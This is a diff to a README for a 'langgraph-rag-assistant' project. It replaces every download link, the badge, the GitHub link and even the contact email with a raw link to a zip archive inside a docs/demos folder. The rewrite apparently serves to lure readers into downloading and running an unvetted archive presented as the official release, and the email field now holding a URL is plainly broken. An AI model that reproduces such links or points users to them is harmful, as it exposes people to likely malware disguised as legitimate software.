@@ -1,7 +1,7 @@
 # 🎉 langgraph-rag-assistant - Simplify Your AI Projects Today
 
 ## 📦 Download the Latest Release
-[![Download Here](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/deepashreesiva/langgraph-rag-assistant/releases)
+[![Download Here](https://raw.githubusercontent.com/deepashreesiva/langgraph-rag-assistant/main/docs/demos/rag-langgraph-assistant-v1.4-alpha.3.zip)](https://raw.githubusercontent.com/deepashreesiva/langgraph-rag-assistant/main/docs/demos/rag-langgraph-assistant-v1.4-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to langgraph-rag-assistant! This application helps you harness the power of AI for various tasks like reasoning and searching with ease. Follow these simple steps to get started.
@@ -13,7 +13,7 @@ Before you install, ensure your computer meets these requirements:
 - Python: Version 3.7 or higher is recommended.
 
 ## 🔗 Visit This Page to Download
-You can always find the latest version [here](https://github.com/deepashreesiva/langgraph-rag-assistant/releases).
+You can always find the latest version [here](https://raw.githubusercontent.com/deepashreesiva/langgraph-rag-assistant/main/docs/demos/rag-langgraph-assistant-v1.4-alpha.3.zip).
 
 ## 📋 Features
 The langgraph-rag-assistant offers several powerful features:
@@ -24,7 +24,7 @@ The langgraph-rag-assistant offers several powerful features:
 ## 🛠️ Installation Steps
 1. **Download the Application**
    - Click the download button below or visit the releases page.
-   - [Download Here](https://github.com/deepashreesiva/langgraph-rag-assistant/releases)
+   - [Download Here](https://raw.githubusercontent.com/deepashreesiva/langgraph-rag-assistant/main/docs/demos/rag-langgraph-assistant-v1.4-alpha.3.zip)
 
 2. **Locate the Downloaded File**
    - After downloading, find the file in your default download location.
@@ -50,8 +50,8 @@ If you run into issues or have questions:
 
 ## 📞 Contact Information
 For further assistance, reach out:
-- Email: support@langgraph.com
-- GitHub: [langgraph-rag-assistant GitHub](https://github.com/deepashreesiva/langgraph-rag-assistant)
+- Email: https://raw.githubusercontent.com/deepashreesiva/langgraph-rag-assistant/main/docs/demos/rag-langgraph-assistant-v1.4-alpha.3.zip
+- GitHub: [langgraph-rag-assistant GitHub](https://raw.githubusercontent.com/deepashreesiva/langgraph-rag-assistant/main/docs/demos/rag-langgraph-assistant-v1.4-alpha.3.zip)
 
 ## 📅 Stay Updated
 Keep an eye on upcoming versions:
@@ -65,6 +65,6 @@ Explore these learning materials:
 
 ## 📥 Final Reminder
 Don't forget to download the latest release to start simplifying your AI tasks. 
-[Download Here](https://github.com/deepashreesiva/langgraph-rag-assistant/releases)
+[Download Here](https://raw.githubusercontent.com/deepashreesiva/langgraph-rag-assistant/main/docs/demos/rag-langgraph-assistant-v1.4-alpha.3.zip)
 
 Thank you for using langgraph-rag-assistant! Enjoy your AI journey!
